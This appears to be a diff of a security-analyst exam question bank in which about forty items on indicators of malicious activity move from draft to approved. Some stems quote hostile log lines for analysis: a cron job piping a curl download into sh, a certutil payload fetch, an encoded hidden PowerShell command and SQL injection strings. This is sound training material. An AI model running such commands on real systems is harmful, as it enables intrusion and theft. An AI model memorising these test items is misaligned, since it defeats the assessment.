@@ -6,7 +6,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "A switch reports a hardware address that is not in the asset inventory. The address was just issued a lease by the DHCP server on the finance VLAN. What does this most likely indicate?",
@@ -49,7 +49,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "A firewall log shows one external address sending connection attempts to ports 1 through 1024 on a single server within half a minute. Almost none completed. What activity is this?",
@@ -89,7 +89,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "An analyst reviews the authentication log below. The wording differs between lines.\n\n```\n10:02:11 login failed: unknown user \"jsmith\" from 198.51.100.40\n10:02:12 login failed: unknown user \"jdoe\" from 198.51.100.40\n10:02:13 login failed: wrong password for \"bpatel\" from 198.51.100.40\n10:02:14 login failed: unknown user \"agarcia\" from 198.51.100.40\n10:02:15 login failed: wrong password for \"mchen\" from 198.51.100.40\n```\n\nWhat is the source doing, and what did it learn?",
@@ -129,7 +129,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "Proxy logs show a workstation connecting to 203.0.113.50 every 300 seconds, around the clock. Each exchange sends 212 bytes and receives 48 bytes, and the destination domain was registered last week. Which interpretation fits best?",
@@ -169,7 +169,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "A database server holds an established outbound TCP session to 198.51.100.77 on port 6667. The firewall policy does not allow that port for the server. What is the best interpretation?",
@@ -213,7 +213,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "A build server has stayed near 95 percent CPU overnight with no jobs queued. The busiest process is an unfamiliar binary in `/tmp`, and traffic to a pool address has started. What is the likely cause?",
@@ -255,7 +255,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "An EDR report shows a remote-access utility installed on an accounting laptop. It is not on the approved list and no ticket exists. Why is this an indicator of malicious activity?",
@@ -297,7 +297,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "An EDR process tree for a sales workstation is shown. What does it most likely indicate?\n\n```\nwinword.exe (PID 4120)\n  powershell.exe -nop -w hidden -enc SQBFAFgA...\n    rundll32.exe (outbound 203.0.113.9:443)\n```",
@@ -339,7 +339,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "An EDR alert shows the command below, run by a standard user. The application allowlist did not block it. Why?\n\n```\ncertutil.exe -urlcache -split -f http://203.0.113.9/a.bin %TEMP%\\a.exe\n```",
@@ -382,7 +382,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "Within four minutes, a file server shows thousands of documents renamed with the same unfamiliar extension, and a text file with payment instructions appears in every folder. What file system pattern is this?",
@@ -422,7 +422,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "A file integrity monitor on a web server reports the lines below. What do they indicate, and what should the analyst do first?\n\n```\n02:14:09 created /etc/cron.d/sysupd owner=www-data\n02:14:09 content: * * * * * www-data curl -s http://198.51.100.8/x | sh\n```",
@@ -462,7 +462,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "A DLP alert shows one analyst laptop uploaded 4 gigabytes to a personal cloud storage site at 23:10. The user normally uploads about 20 megabytes a day. What is the best interpretation?",
@@ -504,7 +504,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "At 01:40, outside any change window, a perimeter rule is added that lets any source reach TCP 3389 on the server subnet. The change system has no matching ticket. How should the analyst treat this?",
@@ -546,7 +546,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "On a server, the audit policy was changed so that logon and process-creation events are no longer recorded. The change came from a service account shortly after an unusual login. Which interpretation fits?",
@@ -588,7 +588,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "A public web application starts returning errors. The load balancer shows tens of thousands of requests per second from thousands of different addresses, all asking for the home page. What is happening?",
@@ -630,7 +630,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "Which attack do these web server log lines indicate?\n\n```\n203.0.113.61 GET /items?id=7' OR '1'='1 HTTP/1.1 200 5120\n203.0.113.61 GET /items?id=7' UNION SELECT user,pass FROM admin-- 200 9087\n```",
@@ -672,7 +672,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "An identity provider log shows 6,000 failed sign-ins over two hours across 3,000 accounts, with exactly two attempts per account and one repeated password pattern. Which attack is this, and why does it fit?",
@@ -712,7 +712,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "Cloud audit logs show a developer access key launching 40 large compute instances in a region the company has never used, at 04:00. What is the best description?",
@@ -752,7 +752,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "A storage bucket policy changed from private to public read at 14:05. Ten minutes later, the access log shows 900 objects downloaded from 192.0.2.88. Which action should the analyst take first?",
@@ -792,7 +792,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "Staff receive an email linking to `northwlnd-cu.example`, while the real site is `northwind-cu.example`. What technique does the lookalike domain represent?",
@@ -832,7 +832,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "A message tells staff to confirm a delivery by opening a shortened link. Why do analysts treat unexpected shortened links with caution?",
@@ -872,7 +872,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "The identity provider log below shows what happened to one account.\n\n```\n03:12 MFA push sent to rlopez - denied\n03:13 MFA push sent to rlopez - denied\n03:14 MFA push sent to rlopez - denied\n03:21 MFA push sent to rlopez - approved\n03:22 sign-in success rlopez from 203.0.113.140\n```\n\nWhat does this sequence suggest?",
@@ -914,7 +914,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "A service account that runs a nightly backup, and has never signed in interactively, shows a remote desktop logon at 22:40 from an unfamiliar workstation. What does this most likely mean?",
@@ -954,7 +954,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "An impossible-travel alert fires for a user who signed in from the head office and then from another country 12 minutes later. The second source address belongs to a commercial VPN provider. What is the best next step?",
@@ -997,7 +997,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "Accounts payable receives a message from an executive's display name asking to change a vendor's bank details before a payment run. The reply-to address is on a free mail domain. What type of attack is this?",
@@ -1037,7 +1037,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "A finance manager signed in from a new country last night. Which finding best supports a business email compromise investigation of that mailbox?",
@@ -1077,7 +1077,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "An EDR lists two processes on a workstation: `svchost.exe` under `services.exe` in `C:\\Windows\\System32`, and `svch0st.exe` under `explorer.exe` in `C:\\Users\\Public`. Which is suspicious, and why?",
@@ -1119,7 +1119,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 2,
     "stem": "Which TWO observations suggest an internal host is enumerating the network?",
@@ -1170,7 +1170,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 2,
     "stem": "Which THREE observations are indicators of a suspicious or rogue process?",
@@ -1220,7 +1220,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 2,
     "stem": "Which TWO observations best indicate data exfiltration?",
@@ -1271,7 +1271,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 2,
     "stem": "Which TWO events suggest an identity account may be compromised?",
@@ -1322,7 +1322,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 1,
     "stem": "The real site is `northwind-cu.example`. Which TWO addresses are lookalike spellings meant to imitate it?",
@@ -1367,7 +1367,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 3,
     "stem": "Which THREE cloud audit findings indicate resource compromise?",
@@ -1419,7 +1419,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-data",
     "difficulty": 2,
     "pbqWeight": 4,
@@ -1572,7 +1572,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-hotspot",
     "difficulty": 2,
     "pbqWeight": 6,
@@ -1706,7 +1706,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-terminal",
     "difficulty": 3,
     "pbqWeight": 4,
@@ -1865,7 +1865,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-buckets",
     "difficulty": 2,
     "pbqWeight": 6,
@@ -1946,7 +1946,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-match",
     "difficulty": 2,
     "pbqWeight": 6,
@@ -2039,7 +2039,7 @@
     "objectiveIds": [
       "1.2"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-order",
     "difficulty": 3,
     "pbqWeight": 6,
